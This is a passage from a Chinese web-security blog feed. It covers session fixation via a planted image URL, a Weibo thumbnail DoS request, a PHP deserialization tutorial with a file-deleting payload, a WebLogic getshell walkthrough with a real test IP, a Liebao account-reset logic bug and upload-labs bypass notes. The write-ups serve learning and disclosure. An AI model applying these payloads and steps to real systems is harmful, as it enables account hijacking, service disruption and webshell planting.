<p>打开后就登录了，其实原理很简单，就是比如这里的系统是用<code>PHPSESSID</code>来验证用户信息的，但是这里<code>PHPSESSID</code>是可控的，所以攻击者可以把受害者的<code>PHPSESSID</code>修改为任何数，然后把自己的<code>PHPSESSID</code>也修改为受害者一样的值就可以登录他们的账号了，是不是很有意思。</p>
<h3 id="漏洞利用加深"><a href="#漏洞利用加深" class="headerlink" title="漏洞利用加深"></a>漏洞利用加深</h3><p>有一种方法可以让受害者莫名的中招，就比如<code>www.xxx.com</code>可以插入图片，那么我把图片地址改为<code>http://www.xxx.cn/web/index/weiqi?PHPSESSID=123321</code>（也就是<code>&lt;img src=&#39;http://www.xxx.cn/web/index/weiqi?PHPSESSID=123321&#39;&gt;</code>）然后用户一打开<code>www.xxx.com</code>就会在后台加载这个<code>url</code>然后他的<code>cookie</code>就变成了<code>123321</code>，然后攻击者去修改自己的<code>cookie</code>为<code>123321</code>就可以登录他们的账号了。</p>
]]></content>
      <categories>
        <category>兴趣爱好</category>
      </categories>
      <tags>
        <tag>Web安全</tag>
      </tags>
  </entry>
  <entry>
    <title>图片设计不当可导致服务器卡顿/CPU占满</title>
    <url>/2018/12/26/%E5%9B%BE%E7%89%87%E8%AE%BE%E8%AE%A1%E4%B8%8D%E5%BD%93%E5%8F%AF%E5%AF%BC%E8%87%B4%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%8D%A1%E9%A1%BF-CPU%E5%8D%A0%E6%BB%A1/</url>
    <content><![CDATA[<blockquote>
<p>由诚殷的师傅挖的新思路，原理是图片大的情况下，<code>cpu</code>处理起来占用率很高，会导致网站卡死或崩溃</p>
</blockquote>
<p>1、抓包的时候看到一个请求，如下图</p>
<p><img src="http://static.zybuluo.com/1kbfree/sluxkp58kn8c2jlwfyzdkokb/image_1cpfmp4j6qh18ig1pdm1qq8jkfc.png" alt="image_1cpfmp4j6qh18ig1pdm1qq8jkfc.png-135kB"></p>
<p>发现这里的<code>high</code>和<code>width</code>是可控的，并且返回的数据包很大，如下图</p>
<p><img src="http://static.zybuluo.com/1kbfree/g44fuayrfwbmimffg9qawt8w/image_1cpfmrpub1tmuhjp18f8ms11gvop.png" alt="image_1cpfmrpub1tmuhjp18f8ms11gvop.png-235.8kB"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">upload.api.weibo.com&#x2F;2&#x2F;mss&#x2F;msget_thumbnail?fid&#x3D;4293773238406131&amp;high&#x3D;19999&amp;width&#x3D;19999&amp;size&#x3D;19999,19999&amp;source&#x3D;4037146678</span></pre></td></tr></table></figure>

<p>请求的时候并且<code>ping</code>，效果如下</p>
<p><img src="http://static.zybuluo.com/1kbfree/jcz6vro1cl4byladx3eocrg9/image_1cpfmtnlc1v1d34sm391dkm146516.png" alt="image_1cpfmtnlc1v1d34sm391dkm146516.png-354.2kB"></p>
<p>可以看到出现了卡顿</p>
<p>那么如果多次请求，服务器就会因为请求的文件太大，导致大量的<code>CPU</code>去运算，然后可能导致服务器卡顿以及崩溃。</p>
<p>不再多次测试，害怕影响的业务，此外，多个这样子的<code>URL</code>都存在，并且<code>high</code>和<code>width</code>都可控。</p>
]]></content>
      <categories>
        <category>兴趣爱好</category>
      </categories>
      <tags>
        <tag>Web安全</tag>
      </tags>
  </entry>
  <entry>
    <title>php反序列化漏洞</title>
    <url>/2018/12/25/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/</url>
    <content><![CDATA[<h3 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h3><p>首先php反序列化没有想象中的那么难，你要知道什么是<strong>类</strong>，什么是<br><strong>魔法方法</strong>就很好理解的，先不说<strong>反序列化</strong>的原理这些</p>
<h3 id="序列化基础"><a href="#序列化基础" class="headerlink" title="序列化基础"></a>序列化基础</h3><p>首先我们要知道什么是类，这个需要你们自己去了解了，所以不多说了（随便介绍一下），见谅～</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Cls</span></span>&#123;</span></pre></td></tr><tr><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="code"><pre><span class="line">	<span class="keyword">public</span> $name = <span class="string">''</span>;</span></pre></td></tr><tr><td class="code"><pre><span class="line">	<span class="keyword">public</span> $age  = <span class="number">0</span>;</span></pre></td></tr><tr><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="code"><pre><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">print_name</span><span class="params">()</span></span>&#123;</span></pre></td></tr><tr><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="code"><pre><span class="line">		<span class="keyword">echo</span> <span class="string">'name is -&gt; '</span>.<span class="keyword">$this</span>-&gt;name;</span></pre></td></tr><tr><td class="code"><pre><span class="line">		<span class="keyword">echo</span> <span class="string">"\n"</span>;</span></pre></td></tr><tr><td class="code"><pre><span class="line">		<span class="keyword">echo</span> <span class="string">'age is -&gt; '</span>.<span class="keyword">$this</span>-&gt;age;</span></pre></td></tr><tr><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="code"><pre><span class="line">	&#125;</span></pre></td></tr><tr><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="code"><pre><span class="line">&#125;</span></pre></td></tr><tr><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="code"><pre><span class="line">$my = <span class="keyword">new</span> Cls(); <span class="comment">// 实例化Cls类，就想这个变量是指向了Cls类，可以直接用这个变量操作Cls类</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">$my-&gt;name = <span class="string">'only_free'</span>; <span class="comment">// 类中定义了$name属性但他值为空，所以我这里重新赋值</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">$my-&gt;age  = <span class="number">18</span>; <span class="comment">// 同上</span></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="keyword">echo</span> $my -&gt; print_name(); <span class="comment">// 调用类中的print_name函数</span></span></pre></td></tr></table></figure>

<p>效果：</p>
<p><img src="http://static.zybuluo.com/1kbfree/vr9s1iyd8i6jubhii9fws46x/image_1cjt19n851b6h1lgq14941dmc1gg319.png" alt="image_1cjt19n851b6h1lgq14941dmc1gg319.png-125.3kB"></p>
<h4 id="序列化这个类"><a href="#序列化这个类" class="headerlink" title="序列化这个类"></a>序列化这个类</h4><p>可以看到这里是成功输出了的，那么我们这里来<strong>序列化</strong>这个类，只需要使用一个函数即可(<code>serialize</code>函数)，如下</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">echo &quot;\n&quot;.&#39;序列化后到结果：&#39;.serialize($my).&quot;\n&quot;;</span></pre></td></tr></table></figure>

<p><img src="http://static.zybuluo.com/1kbfree/mk2scnmp7igtkaqs51hv8x73/image_1cjt1gaai1f4219lf1b8dneuvrd1m.png" alt="image_1cjt1gaai1f4219lf1b8dneuvrd1m.png-144.7kB"></p>
<blockquote>
<p>不懂序列化的作用可以空投到此处：<a href="https://blog.csdn.net/wy0123/article/details/79345842" target="_blank" rel="noopener">https://blog.csdn.net/wy0123/article/details/79345842</a></p>
</blockquote>
<h4 id="反序列化这个序列化的字符"><a href="#反序列化这个序列化的字符" class="headerlink" title="反序列化这个序列化的字符"></a>反序列化这个序列化的字符</h4><p>我们上面那个被序列化后的值为</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">O:3:&quot;Cls&quot;:2:&#123;s:4:&quot;name&quot;;s:9:&quot;only_free&quot;;s:3:&quot;age&quot;;i:18;&#125;</span></pre></td></tr></table></figure>

<p>那么，我们如何把这些字符都变回类呢，那么就要用到反序列化了，代码如下</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Cls</span></span>&#123;</span></pre></td></tr><tr><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="code"><pre><span class="line">	<span class="keyword">public</span> $name = <span class="string">''</span>;</span></pre></td></tr><tr><td class="code"><pre><span class="line">	<span class="keyword">public</span> $age  = <span class="number">0</span>;</span></pre></td></tr><tr><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="code"><pre><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">print_name</span><span class="params">()</span></span>&#123;</span></pre></td></tr><tr><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="code"><pre><span class="line">		<span class="keyword">echo</span> <span class="string">'name is -&gt; '</span>.<span class="keyword">$this</span>-&gt;name;</span></pre></td></tr><tr><td class="code"><pre><span class="line">		<span class="keyword">echo</span> <span class="string">"\n"</span>;</span></pre></td></tr><tr><td class="code"><pre><span class="line">		<span class="keyword">echo</span> <span class="string">'age is -&gt; '</span>.<span class="keyword">$this</span>-&gt;age;</span></pre></td></tr><tr><td class="code"><pre><span class="line">		<span class="keyword">echo</span> <span class="string">"\n"</span>;</span></pre></td></tr><tr><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="code"><pre><span class="line">	&#125;</span></pre></td></tr><tr><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="code"><pre><span class="line">&#125;</span></pre></td></tr><tr><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="code"><pre><span class="line">$xlh = <span class="string">'O:3:"Cls":2:&#123;s:4:"name";s:9:"only_free";s:3:"age";i:18;&#125;'</span>;</span></pre></td></tr><tr><td class="code"><pre><span class="line">var_dump( unserialize( $xlh ) );</span></pre></td></tr></table></figure>

<p><img src="http://static.zybuluo.com/1kbfree/6w5kqn6eh3uzuqn8z2yso0ds/image_1cjtfje7ueo5ft1pt51sqv4nq2j.png" alt="image_1cjtfje7ueo5ft1pt51sqv4nq2j.png-45.9kB"></p>
<p>可以看到我之前定义的<code>类</code>和<code>$name</code>、<code>$age</code>参数都会展示出来的，那么我们再来看下这个反序列化漏洞如何利用</p>
<h4 id="魔术函数介绍"><a href="#魔术函数介绍" class="headerlink" title="魔术函数介绍"></a>魔术函数介绍</h4><blockquote>
<p>不要想太多为什么他叫魔术函数，其实他就是类中内置（规定好）的函数</p>
</blockquote>
<p>首先我们来看看其中一个的<code>__construct()</code>魔术函数可以用来干嘛，代码如下</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span></pre></td></tr><tr><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="code"><pre><span class="line">class Cls&#123;</span></pre></td></tr><tr><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="code"><pre><span class="line">	function __construct()&#123;</span></pre></td></tr><tr><td class="code"><pre><span class="line">		echo &#39;使用了__construct()&#39;;</span></pre></td></tr><tr><td class="code"><pre><span class="line">	&#125;</span></pre></td></tr><tr><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="code"><pre><span class="line">&#125;</span></pre></td></tr><tr><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="code"><pre><span class="line">$cls &#x3D; new Cls();</span></pre></td></tr><tr><td class="code"><pre><span class="line">echo &quot;\n&quot;;</span></pre></td></tr></table></figure>

<p><img src="http://static.zybuluo.com/1kbfree/ap59bkkre7hszhfnuszqw10j/image_1cjtguh609i8dld1lmt5je1sj130.png" alt="image_1cjtguh609i8dld1lmt5je1sj130.png-61kB"></p>
<p>那么这里很容易看明白的了吧，这个<code>__construct</code>魔术方法就是当有变量<code>new</code>这个类的时候就会自动调用，就是说实例化<code>Cls</code>类就会触发<code>__construct</code>方法，那么我序列化是需要用到这个的，下面来看看～</p>
<blockquote>
<p>更多的魔术函数可以来这里看看：<a href="https://www.cnblogs.com/jakentec/p/3806793.html" target="_blank" rel="noopener">https://www.cnblogs.com/jakentec/p/3806793.html</a></p>
</blockquote>
<h3 id="序列化漏洞利用"><a href="#序列化漏洞利用" class="headerlink" title="序列化漏洞利用"></a>序列化漏洞利用</h3><p>首先，这里漏洞自我感觉还是挺难挖到的（不是难，而是因为利用条件刻薄），待我一一说来～</p>
<p>首先我写了一个小案例（代码执行的漏洞），如下</p>
<p><img src="http://static.zybuluo.com/1kbfree/xvej8v5zi6wawew4qphnexiy/image_1cjthdab5euv1ltl115bha0pg03q.png" alt="image_1cjthdab5euv1ltl115bha0pg03q.png-23.8kB"></p>
<ul>
<li><code>bug.php</code>是存在反序列化漏洞的地方</li>
<li><code>class.php</code>是定义一个了一个类（等下会讲的）</li>
<li><code>poc.php</code>是构造的poc</li>
</ul>
<h4 id="复现过程"><a href="#复现过程" class="headerlink" title="复现过程"></a>复现过程</h4><p>1、我们先来看看<code>class.php</code>这个文件</p>
<p><img src="http://static.zybuluo.com/1kbfree/33x2db12p74s9wuxmmvtrbeh/image_1cjtj57j51no91cqb404aoc1isf51.png" alt="image_1cjtj57j51no91cqb404aoc1isf51.png-89.9kB"></p>
<p>可以看到这里有一个类，效果是当这个类被消除的时候就会执行这个函数（当php快要执行完后就会消除这个类，就会执行这个函数），那么我们想，如果我们能够执行这个类，并且把文件名变成任意一个文件的话就可以导致任意文件删除漏洞了，对吧，我们继续来看下</p>
<p>2、查看<code>bug.php</code>里的代码</p>
<p><img src="http://static.zybuluo.com/1kbfree/ze5o6geiqcot9vuyro0nmtf1/image_1cjtit7fo10801bc31ihk14411mrs4k.png" alt="image_1cjtit7fo10801bc31ihk14411mrs4k.png-136.8kB"></p>
<p>3、我们来构造一个利用的poc</p>
<p>前面我们知道了反序列化是可以执行一个类的对吧，那么好玩的来了，我们就可以构造一个操做<code>Delete</code>的类，并且把他要删除的内容为任意一个存在的文件即可，那么我们可以这样</p>
<p><img src="http://static.zybuluo.com/1kbfree/yiweahc18bcbdfartf8rhg2k/image_1cjtjm38l1m1219f71t951pvn1g0078.png" alt="image_1cjtjm38l1m1219f71t951pvn1g0078.png-87.9kB"></p>
<p>可以看到我们实例化了类，并且自定义了要删除的文件，然后序列化，并且把序列化的值放入那个反序列化的可控点，我们就可以执行那个删除文件的类，如何我们再自定义文件名，就可以导致任意文件删除了，所以我们现在只要找到反序列（<code>bug.php</code>），然后我们把序列化后的值放上去~</p>
<p>4、将操作类的代码序列化并且放入可控的反序列化处</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">O:6:&quot;Delete&quot;:1:&#123;s:4:&quot;file&quot;;s:9:&quot;index.php&quot;;&#125;</span></pre></td></tr></table></figure>

<p>这个是序列化操作类的值，然后放入<code>bug.php</code>文件里</p>
<p><img src="http://static.zybuluo.com/1kbfree/m1l2jxeqswn75kvacv9pycvj/image_1cjvlbe9nikk1f9cpbbk3j7qh9.png" alt="image_1cjvlbe9nikk1f9cpbbk3j7qh9.png-75.8kB"></p>
<p>可以看到，我们成功的执行了删除<code>index.php</code>的代码，所以这里是存在反序列化漏洞造成的任意文件删除漏洞~</p>
<p>案例下载地址：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">链接: https:&#x2F;&#x2F;pan.baidu.com&#x2F;s&#x2F;1vbldBSypdozwbqBEYwu1tQ 密码: 6666</span></pre></td></tr></table></figure>

<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>所以，反序列化漏洞需要找到一个反序列化可控点，然后找里面类是否使用魔术函数以及类中是否可操作~</p>
]]></content>
      <categories>
        <category>编程</category>
      </categories>
      <tags>
        <tag>代码审计</tag>
      </tags>
  </entry>
  <entry>
    <title>weblogic getshell</title>
    <url>/2018/12/21/getshell/</url>
    <content><![CDATA[<blockquote>
<p>测试地址：<br><a href="http://60.166.38.218:7001" target="_blank" rel="noopener">http://60.166.38.218:7001</a></p>
</blockquote>
<h2 id="测试是否为weblogic"><a href="#测试是否为weblogic" class="headerlink" title="测试是否为weblogic"></a>测试是否为<code>weblogic</code></h2><h3 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h3><p>这个是最直观的办法，也就是看<code>404</code>、<code>403</code>页面，如下图就是<code>weblogic</code>特定的<code>404</code>页面，虽然输入一个不存在的文件名就可以看到</p>
<p><img src="http://static.zybuluo.com/1kbfree/fmmxdue20bxm9ppo3n9t4gwi/image_1d1rp09nn1ut0jsh6s86ikjta2a.png" alt="image_1d1rp09nn1ut0jsh6s86ikjta2a.png-343.4kB"></p>
<p>如下是<code>weblogic</code>特定的<code>403</code>版本</p>
<p><img src="http://static.zybuluo.com/1kbfree/rxl08hxoz4yt82o7firhy3nr/image_1d1roitookvq183qps6itq10j6m.png" alt="image_1d1roitookvq183qps6itq10j6m.png-195.7kB"></p>
<h3 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h3><p>访问其管理控制台<code>/console/</code>目录</p>
<h3 id="方法三"><a href="#方法三" class="headerlink" title="方法三"></a>方法三</h3><p>开放<code>7001</code>, <code>7002</code>, 等特定<code>weblogic</code>常用端口</p>
<h3 id="方法四"><a href="#方法四" class="headerlink" title="方法四"></a>方法四</h3><p>特定返回包头部信息，如</p>
<p><img src="http://static.zybuluo.com/1kbfree/54eu921fjfmzu69we0mutsfz/image_1d1rp2gma1is6169e17e21vrv1t359.png" alt="image_1d1rp2gma1is6169e17e21vrv1t359.png-741.3kB"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Servlet&#x2F;x.x JSP&#x2F;x.x</span></pre></td></tr></table></figure>

<h3 id="方法四-1"><a href="#方法四-1" class="headerlink" title="方法四"></a>方法四</h3><p>存在<code>/wls-wsat/</code>目录，如</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;xx.xxx.xx:7001&#x2F;wls-wsat&#x2F;CoordinatorPortType</span></pre></td></tr></table></figure>

<p><img src="http://static.zybuluo.com/1kbfree/4rzuoyfqy98201wa53bo2rs6/image_1d1rp44eiiqqcjb5l1md418omm.png" alt="image_1d1rp44eiiqqcjb5l1md418omm.png-236.1kB"></p>
<h3 id="方法五"><a href="#方法五" class="headerlink" title="方法五"></a>方法五</h3><p>这个是<code>weblogic ssrf</code>，链接如下</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;xxx.xxx.xxx&#x2F;uddiexplorer&#x2F;SearchPublicRegistries.jsp?operator&#x3D;http:&#x2F;&#x2F;localhost&#x2F;robots.txt&amp;rdoSearch&#x3D;name&amp;txtSearchname&#x3D;sdf&amp;txtSearchkey&#x3D;&amp;txtSearchfor&#x3D;&amp;selfor&#x3D;Business+location&amp;btnSubmit&#x3D;Search</span></pre></td></tr></table></figure>

<p>这里用第一种办法就测试出来了，如何拿去工具哪儿连接试试~</p>
<p><img src="http://static.zybuluo.com/1kbfree/joltv56o1jg14iafz3vrfdj4/image_1d1rpe3d8a57m4tkoj1v4a174k13.png" alt="image_1d1rpe3d8a57m4tkoj1v4a174k13.png-31.5kB"></p>
<p><img src="http://static.zybuluo.com/1kbfree/fa2wfmprqky9e67u0c3ffima/image_1d1rpgbtc7dai8v1rbq1g7m1dbn1g.png" alt="image_1d1rpgbtc7dai8v1rbq1g7m1dbn1g.png-17.7kB"></p>
<p>确认可以执行命令等操作之后就要定位<code>war</code>包</p>
<h2 id="定位war包"><a href="#定位war包" class="headerlink" title="定位war包"></a>定位<code>war</code>包</h2><blockquote>
<p>为何要定位<code>war</code>包？<br>因为我们要上传文件，而我们把文件上传到<code>web</code>路径是无法访问的，上传到<code>war</code>包才能够进行访问，导致<code>getshell</code></p>
</blockquote>
<p>网上有很多很复杂的，用下面这个方法挺简单的~ 首先用如下命令找所有的<code>war</code>包里存在的<code>index.html</code>的路径</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">locate war&#x2F;index.html</span></pre></td></tr></table></figure>

<p><img src="http://static.zybuluo.com/1kbfree/waiakowi5fm3k0bvo6i1os5n/image_1d1rpq28j1rq560equnrbednf1t.png" alt="image_1d1rpq28j1rq560equnrbednf1t.png-15.5kB"></p>
<p>然后就<code>2</code>个，经过测试发现第一个是正确的路径（这样子测试的：每个路径下都去上传文件，然后看看能不能打开~）</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;home&#x2F;weblogic&#x2F;Oracle&#x2F;Middleware&#x2F;user_projects&#x2F;domains&#x2F;base_domain&#x2F;servers&#x2F;AdminServer&#x2F;tmp&#x2F;_WL_internal&#x2F;bea_wls_internal&#x2F;9j4dqk&#x2F;war&#x2F;index.html</span></pre></td></tr></table></figure>

<p>然后在这个路径下上传个<code>test.txt</code>，内容为<code>hello world</code>，如图</p>
<p><img src="http://static.zybuluo.com/1kbfree/re8q5pm5drpq3n5x9lx10w75/image_1d1rq9r6o1ldc8qjo71c351ijq2a.png" alt="image_1d1rq9r6o1ldc8qjo71c351ijq2a.png-56.8kB"></p>
<p>然后访问</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;xxx.xxx.xxx&#x2F;bea_wls_internal&#x2F;test.txt</span></pre></td></tr></table></figure>

<p><img src="http://static.zybuluo.com/1kbfree/0erplnym9hufv0iz8u3xcv7l/image_1d1rqc8qffos1ogad0m18t4dmc2n.png" alt="image_1d1rqc8qffos1ogad0m18t4dmc2n.png-13.4kB"></p>
<h2 id="补充知识点"><a href="#补充知识点" class="headerlink" title="补充知识点"></a>补充知识点</h2><p>特定版本的话可以直接<code>getshell</code>，因为特定版本的<code>war</code>包就是在下面这路径</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;home&#x2F;weblogic&#x2F;Oracle&#x2F;Middleware&#x2F;user_projects&#x2F;domains&#x2F;base_domain&#x2F;servers&#x2F;AdminServer&#x2F;tmp&#x2F;_WL_internal&#x2F;bea_wls_internal&#x2F;9j4dqk&#x2F;war&#x2F;</span></pre></td></tr></table></figure>

<p>然后直接上传直接访问</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;xxx.xxx.xxx:7001&#x2F;bea_wls_internal&#x2F;文件名</span></pre></td></tr></table></figure>

<p>就可以了</p>
]]></content>
      <categories>
        <category>兴趣爱好</category>
      </categories>
      <tags>
        <tag>Web安全</tag>
      </tags>
  </entry>
  <entry>
    <title>猎豹浏览器个人中心逻辑错误导致重置用户数据</title>
    <url>/2018/12/21/%E7%8C%8E%E8%B1%B9%E6%B5%8F%E8%A7%88%E5%99%A8%E4%B8%AA%E4%BA%BA%E4%B8%AD%E5%BF%83%E9%80%BB%E8%BE%91%E9%94%99%E8%AF%AF%E5%AF%BC%E8%87%B4%E9%87%8D%E7%BD%AE%E7%94%A8%E6%88%B7%E6%95%B0%E6%8D%AE/</url>
    <content><![CDATA[<p><img src="http://static.zybuluo.com/1kbfree/8lclan37q1ixlfnev3gkxh1m/ld.png" alt="ld.png-26.7kB"></p>
<p>这个漏洞只能是只绑定了<code>QQ</code>的，就是只用QQ登陆的用户</p>
<p>1、打开Url：<a href="http://i.liebao.cn/，首先来确认下这个是保存了数据的，如图" target="_blank" rel="noopener">http://i.liebao.cn/，首先来确认下这个是保存了数据的，如图</a></p>
<p><img src="http://static.zybuluo.com/1kbfree/m7bhi7emewsfy94wtgkkd0sa/image_1cjpp6pisqiihlv1fah1m5h1v4gp.png" alt="image_1cjpp6pisqiihlv1fah1m5h1v4gp.png-144.5kB"></p>
<p><img src="http://static.zybuluo.com/1kbfree/6fx6nip8g7u15z53nh0qrutr/image_1cjpp7uibcgr1t881jd515t1ru916.png" alt="image_1cjpp7uibcgr1t881jd515t1ru916.png-121.5kB"></p>
<p>可以看到这些都是存在的，那么来看我是如何来重置的~</p>
<p><img src="http://static.zybuluo.com/1kbfree/fiyer0ec80dwb6lskdgnoxgh/image_1cjppa3u017p4ucr56g1smk16pv1j.png" alt="image_1cjppa3u017p4ucr56g1smk16pv1j.png-151.3kB"></p>
<p>点击上图的已关联</p>
<p><img src="http://static.zybuluo.com/1kbfree/7mjdg0igxj1p3u3u2ef06v0h/image_1cjppar4n1idj1s6qk98lv1no220.png" alt="image_1cjppar4n1idj1s6qk98lv1no220.png-126.2kB"></p>
<p>2、点击取消关联并且抓包</p>
<p>这里要抓对包来~那么我抓到的包在下面：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST &#x2F;account&#x2F;qqunbin HTTP&#x2F;1.1</span></pre></td></tr><tr><td class="code"><pre><span class="line">Host: i.ijinshan.com</span></pre></td></tr><tr><td class="code"><pre><span class="line">User-Agent: Mozilla&#x2F;5.0 (X11; Linux x86_64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;41.0.2227.0 Safari&#x2F;537.36</span></pre></td></tr><tr><td class="code"><pre><span class="line">Accept: *&#x2F;*</span></pre></td></tr><tr><td class="code"><pre><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.8,en-US;q&#x3D;0.5,en;q&#x3D;0.3</span></pre></td></tr><tr><td class="code"><pre><span class="line">Accept-Encoding: gzip, deflate</span></pre></td></tr><tr><td class="code"><pre><span class="line">DNT: 1</span></pre></td></tr><tr><td class="code"><pre><span class="line">X-Requested-With: XMLHttpRequest</span></pre></td></tr><tr><td class="code"><pre><span class="line">Referer: http:&#x2F;&#x2F;i.ijinshan.com&#x2F;liebao&#x2F;unbind_qq?act&#x3D;unqq_f&amp;pp&#x3D;kswl714700207&amp;sid&#x3D;25664df22557c34fc31e781ab2414336</span></pre></td></tr><tr><td class="code"><pre><span class="line">Content-Length: 0</span></pre></td></tr><tr><td class="code"><pre><span class="line">Content-Type: text&#x2F;plain;charset&#x3D;UTF-8</span></pre></td></tr><tr><td class="code"><pre><span class="line">Cookie: PHPSESSID&#x3D;dnndrfci414m8bc7cpu2o56b24</span></pre></td></tr><tr><td class="code"><pre><span class="line">Connection: close</span></pre></td></tr></table></figure>

<p>也就是Url：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">i.ijinshan.com&#x2F;account&#x2F;qqunbin</span></pre></td></tr></table></figure>

<p>直接访问上图的Url会取消绑定QQ，如下</p>
<p><img src="http://static.zybuluo.com/1kbfree/eb3kxcz8nzcamnyhco0ckzhj/image_1cjpph1q51hecjt91rbm1a8bb3s2d.png" alt="image_1cjpph1q51hecjt91rbm1a8bb3s2d.png-90.5kB"></p>
<p><strong>注意：</strong>这里解绑后重新登陆才可以（感觉是个<code>bug</code>，解绑了不是立马显示出来还要重新登陆）</p>
<p>3、重新登陆</p>
<p>用刚刚被解绑的qq账号重新登陆一下，会来到这个页面</p>
<p><img src="http://static.zybuluo.com/1kbfree/mgzhsniczjs04omc6zvhavzp/image_1cjpppv0fuhe134v1vf1qb15ia2q.png" alt="image_1cjpppv0fuhe134v1vf1qb15ia2q.png-250.9kB"></p>
<p>然后点击自动创建（因为这个账号没了，所以可以自动创建）</p>
<p>4、登陆后查看效果</p>
<p><img src="http://static.zybuluo.com/1kbfree/x5y1jtc79rn9cc0n3nx0xlrn/image_1cjppvns4vt5lj81uhr1cddbe6a.png" alt="image_1cjppvns4vt5lj81uhr1cddbe6a.png-141.7kB"></p>
<p><img src="http://static.zybuluo.com/1kbfree/prqr2gdlhnafq9coefsv3b1s/image_1cjpq0rj51ekf1ccj1u7apuj1mci6n.png" alt="image_1cjpq0rj51ekf1ccj1u7apuj1mci6n.png-112.5kB"></p>
<p>ok，没了</p>
]]></content>
      <categories>
        <category>兴趣爱好</category>
      </categories>
      <tags>
        <tag>Web安全</tag>
      </tags>
  </entry>
  <entry>
    <title>upload-labs通关笔记</title>
    <url>/2018/12/18/upload-labs%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[<p><strong>第一关：</strong></p>
<p><img src="http://static.zybuluo.com/1kbfree/dfxzko0fx07b0zzwhs8b9rc5/image.png" alt="image.png-194.5kB"></p>
<p>可以看到这里的上传的验证是<code>javascript</code>验证的，也就是前台认证，但是我们可以利用后台验证绕过。</p>
<p>步骤：<br>1、上传一个<code>2.png</code><br>2、抓包将<code>2.png</code>修改为<code>2.php</code></p>
<p><img src="http://static.zybuluo.com/1kbfree/7i5cct348yr73j5bb5lvq83o/1.png" alt="1.png-225.3kB"></p>
<p>然后看看是否成功上传</p>
<p><img src="http://static.zybuluo.com/1kbfree/yalbi6a2hqg1edk2av1g1irf/1.png" alt="1.png-16.1kB"></p>
<blockquote>
<p><code>upload</code>目录是这个靶机上传的文件的存放目录，所以上传的东西都会在这里，所以看有没有成功上传的话可以直接来这里看，或者去访问一下<code>http://xxx.xxx.xxx/upload/文件名</code>，如我刚刚上传的<code>2.php</code>就是这个链接</p>
</blockquote>
<p><a href="http://127.0.0.1/upload/upload/2.php" target="_blank" rel="noopener">http://127.0.0.1/upload/upload/2.php</a></p>
<p><img src="http://static.zybuluo.com/1kbfree/angm6k565a0a80yb92s88aag/1.png" alt="1.png-51.8kB"></p>
<p><strong>第二关：</strong></p>
<p><img src="http://static.zybuluo.com/1kbfree/tqnbqfhzv9lwkw5czg14ww0r/1.png" alt="1.png-256kB"></p>
<p>所谓文件类型就是上传文件的时候请求中的<code>Content-Type</code>，如下</p>
<p><img src="http://static.zybuluo.com/1kbfree/l3to2zba83jvgqcwo4qd29m9/1.png" alt="1.png-206.5kB"></p>
<p>这关的代码逻辑就是，如果上传的文件类型是<code>image/jpeg</code>或<code>image/png</code>或<code>image/gif</code>就可以上传。那么只要上传一个<code>php</code>文件，然后把文件类型修改为<code>image/jpeg</code>即可上传</p>
<p><img src="http://static.zybuluo.com/1kbfree/xjeoam8717exn8g2d242f27c/1.png" alt="1.png-132.5kB"></p>
<p><img src="http://static.zybuluo.com/1kbfree/reje45f4tr5e91y6l1wnxwtk/1.png" alt="1.png-30.6kB"></p>
<p>成功上传~</p>
<p><strong>第三关：</strong></p>
<blockquote>
<p>此关就是后台禁止<code>php</code>、<code>jsp</code>、<code>asp</code>、<code>aspx</code>这四个文件上传</p>
</blockquote>
